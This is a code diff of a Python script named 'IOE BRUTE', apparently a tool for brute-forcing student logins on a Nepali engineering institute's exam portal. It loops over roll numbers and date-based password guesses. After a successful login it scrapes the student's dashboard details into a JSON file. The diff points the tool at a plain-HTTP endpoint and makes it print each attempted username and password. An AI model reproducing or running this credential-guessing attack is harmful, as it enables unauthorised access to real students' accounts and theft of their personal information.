@@ -4,7 +4,6 @@ import sys
 import re
 import json
 
-
 #tries to import the modules, if not found it installs them 
 try:
     import mechanize
@@ -50,7 +49,7 @@ def main():
 def icon():
     result = pyfiglet.figlet_format("IOE BRUTE")
     print(result)
-    print("Developed by Sandeep Poudel  :P   :)\n")
+    print("Developed by Sandeep Poudel )\n")
 
 
 # Gets the college that user want to use
@@ -64,8 +63,6 @@ def get_college():
         3: "PUR",
         4: "PAS"
     }
-
-    #TODO Add Thapathali code.
     
     print('''Enter the college of the students:
     Thapathali     ---  1
@@ -148,7 +145,7 @@ def get_faculty():
             fac = int(input("Enter your choice: "))
             if fac == 99:
                 sys.exit()
-            if fac not in range(1, 5):
+            if fac not in range(1, 8):
                 print("\nPlease enter a valid input \n")
             return faculty_map[fac]
 
@@ -223,7 +220,8 @@ def run(college, batch, faculty, noOfStudents, data, getYear):
         rep = True
         updateData(initialMonth, students, data, getYear)
         if students not in data["dataInFile"][0]["arrayData"]:
-            print(f"\b\b\b\bCurrently on student {students}")
+            print(f"\r ")
+            print(f"\rCurrently on student {students}")
         
 
         if students < 10:
@@ -235,7 +233,6 @@ def run(college, batch, faculty, noOfStudents, data, getYear):
         # Loop through the months starting from the month that you left off before.
         for month in range(initialMonth, 13):
             data["dataInFile"][0][f'{getYear}']["checkedMonth"] = month
-            print("\r" + str(month).zfill(2), end=" ")
             # Update the values in the JSON file every time one month is completed
             updateData(month, students, data, getYear)
 
@@ -253,7 +250,6 @@ def run(college, batch, faculty, noOfStudents, data, getYear):
                         password = passMonth + str(days)
                     if rep:
                         # Function that tries to login to the website
-                        
                         login(roll, password, data, students)
                     else:
                         break
@@ -274,9 +270,10 @@ def run(college, batch, faculty, noOfStudents, data, getYear):
 def login(username, password, data, students):
     global rep
     try:
-        br.open("https://examform.ioe.edu.np/Login")
+        br.open("http://exam.ioe.edu.np:81/Login")
 
         #checking internet connection
+        
     except mechanize.HTTPError:
         print("No internet Connection")
         again=input("Do you want to try again? (y/n)")
@@ -292,6 +289,7 @@ def login(username, password, data, students):
     br.select_form(nr=0)
     br.form['UserName'] = username
     br.form['Password'] = password
+    print("\r" + username + " " + password, end=" ")
     br.submit()
     response = br.response().read()
 
@@ -302,7 +300,7 @@ def login(username, password, data, students):
     if json.loads(response)['IsSuccess']:
         rep= False
         print("\r"+"\b\b\b\b         ")
-        br.open("https://examform.ioe.edu.np/StudentPortal/Dashboard")
+        br.open("http://exam.ioe.edu.np:81/StudentPortal/Dashboard")
         #calling function to find the details and write it in files.
         details(data, students)
 
@@ -404,22 +402,25 @@ def updateData(newMonth, newRoll, data, year):
 #sort the json file in ascending order of ROll number of students.
 #sorts in every sucessful login so that the details are shown in ascending order which makes it easier to find and search a specific person.
 
+def extract_number(registration_no):
+    print(registration_no)
+    # Extracts the last numeric part from the registration number
+    match = re.search(r'\d+$', registration_no)
+    if match:
+        return int(match.group())
+    else:
+        return 0
+
 def sort(file):
-    with open(file,"r") as f:
-        data=json.load(f)
-
-    for i in range(1,len(data)-1):
-            for j in range(i+1,len(data)):
-                if (data[i]['Registration No']>data[j]['Registration No']):
-                    data[i],data[j]=data[j],data[i]
-    for i in range(0,len(data)-1):
-        for j in range(i+1,len(data[0]['arrayData'])):
-            if (data[0]["arrayData"][i] > data[0]["arrayData"][j]):
-                data[0]["arrayData"][i] , data[0]["arrayData"][j]=data[0]["arrayData"][j],data[0]["arrayData"][i]
-
+    with open(file, "r") as f:
+        data = json.load(f)
+    # Sort based on registration number
+    data[1:] = sorted(data[1:], key=lambda x: extract_number(x['Registration No']))
+    # Sort arrayData within the first element
+    data[0]['arrayData'] = sorted(data[0]['arrayData'], key=extract_number)
     with open(file, "w") as f:
-        json.dump(data,f)
-	
+        json.dump(data, f)
+
 
 # running the main function
 if __name__ == '__main__':
